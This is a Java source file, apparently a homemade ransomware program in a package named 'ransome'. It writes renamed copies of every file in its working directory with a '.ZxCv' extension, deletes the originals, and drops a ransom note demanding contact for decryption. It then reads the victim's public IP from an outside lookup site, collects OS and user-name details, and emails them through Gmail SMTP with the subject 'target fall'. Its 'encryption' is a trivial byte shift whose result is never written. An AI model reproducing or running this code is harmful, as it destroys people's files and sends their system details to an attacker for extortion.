/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package ransome;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.MalformedURLException;


import java.net.URL;
import java.util.Properties;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;



import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
/**
 *
 * @author sicario
 */
public class Ransome {
    
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
         File ff=new File("");
       File src=new File(ff.getAbsolutePath()/*"C:\Users\sicario"*/);
       File []files=src.listFiles();
     try{  for(File f : files){
           if(!f.getName().equals("lib")){
               Encrypting(f,src); f.delete();
           }
           if(f.getName().equals("Solo")){
               f.delete();
           }
       }}catch (Exception e){
           
       }
       ff=new File("important file.txt");
       FileWriter fw=new FileWriter(ff);
       PrintWriter pw=new PrintWriter(fw);String key="QDam78AZMLOoi20M?bvWxVP";
        pw.println("Your data is encrypted");
        pw.println("Contact me here *xyz* to get it decrypted");
         pw.close();
           Email email =new Email("xyz@gmail.com", /*your email password*/"", "xyz@gmail.com"
                   , "xyz@gmail.com", "smtp.gmail.com", "target fall", getMyIp_os())
                   ;email.sending();
                   
      //  System.out.println(getMyIp_os());
        
    }
    static byte[] EncryptAlgo(byte []data){
        byte []enc =new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            if(i %2==0) enc[i]=(byte)(data[i]+1);
            else enc[i]=(byte)(data[i]-2);
        }
        
    return enc;}
    static String getRandomName(int lenght,String extend){
     Random r=new Random();
     StringBuilder res=new StringBuilder();
        for (int i = 0; i < lenght; i++) {
            char c='a';
            int width=26;
            if(r.nextInt(3)==0){
                c='A'; width=26;
            }
            if(r.nextInt(3)==1){
                c='0'; width=10;
            }
           res.append((char)(c+r.nextInt(width)));
        }
       res.append(".").append(extend);
    return  res.toString();}
   static void Encrypting( File source , File dest) throws IOException{
       InputStream is =null;
       OutputStream os=null;
       dest=new File(dest.getPath().concat("/").concat(getRandomName(10, "ZxCv")));
       try{
          is=new FileInputStream(source);
          os=new FileOutputStream(dest);
          os.write(new byte[]{(byte)source.getName().length()});
          os.write(StringtoByte(source.getName()));
          byte []buffer =new byte[1024];
          int lenght;
          while((lenght=is.read(buffer))>0){
              EncryptAlgo(buffer);
              os.write(buffer,0,lenght);
          }
       }finally{
         is.close();os.close();
       }
   }
static byte[] StringtoByte(String data){
    char ca[]=data.toCharArray();
    byte []res=new byte[ca.length*2];
    for (int i = 0; i < res.length; i++) {
        res[i]=(byte)((ca[i/2]>>(8-(i%2)*8))& 0xff);
        
    }
return res;}
static String getMyIp_os() throws IOException{
    String myIp = null;String sys_info = null;
    String url="https://ipv4bot.whatismyipaddress.com/";
        try {
            BufferedReader br=new BufferedReader(new InputStreamReader(new URL(url).openStream()));
           myIp =br.readLine();
             String os=System.getProperty("os.name");
       String os_arch=System.getProperty("sun.arch.data.model");
       String cpu_arch=System.getProperty("os.arch");
       String user_name=System.getProperty("user.name");
     sys_info  ="os is : "+os+"\n os architecture :"+os_arch+"\n cpu architecture :"+cpu_arch+"\n user name : "+user_name;
        } catch (MalformedURLException ex) {
            Logger.getLogger(Ransome.class.getName()).log(Level.SEVERE, null, ex);
        }
       
return "ip : "+myIp+"\n"+sys_info;}
static class Email{
    String username;
    String password;
    String fromEmail,toEmail,host,subject,messagetext;

        public Email(String username, String passwword, String fromEmail, String toEmail, String host, String subject, String messagetext) {
            this.username = username;
            this.password = passwword;
            this.fromEmail = fromEmail;
            this.toEmail = toEmail;
            this.host = host;
            this.subject = subject;
            this.messagetext = messagetext;
        }
    
        void sending(){
            Properties properties=new Properties();
            properties.put("mail.smtp.auth", "true");
		properties.put("mail.smtp.starttls.enable", "true");
		properties.put("mail.smtp.host", host);
		properties.put("mail.smtp.port", "587");
                /*  Session session=Session.getInstance(properties,new javax.mail.Authenticator(){
                      protected PasswordAuthentication GetPasswordAuthentication(){
                          
                     return  new PasswordAuthentication(username,"aminegasatestaminegasatest".toCharArray());}
                  });*/
                  Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
                    
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username,password);
			}
		});
                  
               MimeMessage msg=new MimeMessage(session);
               try {
			msg.setFrom(new InternetAddress(fromEmail));
			msg.addRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));
			msg.setSubject(subject);
			msg.setText(messagetext);
			Transport.send(msg);
			System.out.println("keys sent successfully");
		} catch (MessagingException e) {
			e.printStackTrace();
		}
        }
       
            
}
}
